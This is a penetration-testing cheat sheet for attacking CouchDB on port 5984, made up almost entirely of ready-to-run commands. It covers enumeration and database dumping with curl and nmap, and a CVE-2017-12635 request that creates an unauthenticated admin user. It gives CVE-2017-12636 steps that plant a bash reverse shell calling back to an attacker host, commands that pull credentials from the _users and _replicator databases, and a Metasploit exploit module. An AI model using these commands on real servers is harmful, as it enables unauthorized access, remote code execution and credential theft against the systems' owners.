# Port 5984 - CouchDB

## Table of Contents
- [Enumeration](#enumeration)
- [Database Operations](#database-operations)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -s "http://$rhost:5984/" && curl -s "http://$rhost:5984/_all_dbs"
```

### Nmap

```shell
nmap -sV -sC -p 5984,6984 $rhost
nmap -p 5984 --script "couchdb-databases,couchdb-stats" $rhost
```

### Basic Information

```shell
# Server info
curl -s "http://$rhost:5984/"

# List databases
curl -s "http://$rhost:5984/_all_dbs"

# Get server stats
curl -s "http://$rhost:5984/_stats"

# Get config
curl -s "http://$rhost:5984/_config"
```

---

## Database Operations

### List and Access Databases

```shell
# List all databases
curl -s "http://$rhost:5984/_all_dbs"

# Get database info
curl -s "http://$rhost:5984/database_name"

# List all documents
curl -s "http://$rhost:5984/database_name/_all_docs"

# Get document content
curl -s "http://$rhost:5984/database_name/_all_docs?include_docs=true"

# Get specific document
curl -s "http://$rhost:5984/database_name/document_id"
```

### With Authentication

```shell
# Using basic auth
curl -u admin:password -s "http://$rhost:5984/_all_dbs"

# Using cookie auth
# Get session
curl -X POST "http://$rhost:5984/_session" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=admin&password=password" \
  -c cookies.txt

# Use session
curl -b cookies.txt -s "http://$rhost:5984/_all_dbs"
```

---

## Exploitation

### CVE-2017-12635 - Privilege Escalation

> Allows creating admin user without authentication

```shell
# Create admin user
curl -X PUT "http://$rhost:5984/_users/org.couchdb.user:pwned" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "user",
    "name": "pwned",
    "roles": ["_admin"],
    "roles": [],
    "password": "pwned"
  }'
```

### CVE-2017-12636 - RCE via Config

> Allows RCE through query_server configuration

```shell
# Step 1: Set query_server
curl -X PUT "http://$rhost:5984/_config/query_servers/cmd" \
  -H "Content-Type: application/json" \
  -d '"bash -c \"bash -i >& /dev/tcp/$lhost/$lport 0>&1\""'

# Step 2: Create database
curl -X PUT "http://$rhost:5984/pwned"

# Step 3: Create document
curl -X PUT "http://$rhost:5984/pwned/test" \
  -H "Content-Type: application/json" \
  -d '{"_id": "test"}'

# Step 4: Create view to trigger execution
curl -X PUT "http://$rhost:5984/pwned/_design/test" \
  -H "Content-Type: application/json" \
  -d '{"_id":"_design/test","views":{"test":{"map":""}},"language":"cmd"}'
```

### Read Sensitive Documents

```shell
# Look for users database
curl -s "http://$rhost:5984/_users/_all_docs?include_docs=true"

# Look for replicator (may contain credentials)
curl -s "http://$rhost:5984/_replicator/_all_docs?include_docs=true"

# Search for passwords
curl -s "http://$rhost:5984/config/_all_docs?include_docs=true"
```

### Metasploit

```shell
# CouchDB RCE
use exploit/multi/misc/couchdb_exec
set RHOSTS $rhost
set LHOST $lhost
run
```

---

## CouchDB Ports

| Port | Service | Description |
| :--- | :--- | :--- |
| 5984 | CouchDB | HTTP API |
| 6984 | CouchDB | HTTPS API |
| 4369 | EPMD | Erlang Port Mapper |

---

## Quick Reference

| Endpoint | Description |
| :--- | :--- |
| `/_all_dbs` | List databases |
| `/db/_all_docs` | List documents |
| `/db/_all_docs?include_docs=true` | Get all docs with content |
| `/_config` | Get configuration |
| `/_users` | User database |

| Command | Description |
| :--- | :--- |
| `curl http://$rhost:5984/` | Server info |
| `curl http://$rhost:5984/_all_dbs` | List databases |
| `nmap -p 5984 --script "couchdb-*" $rhost` | CouchDB enumeration |
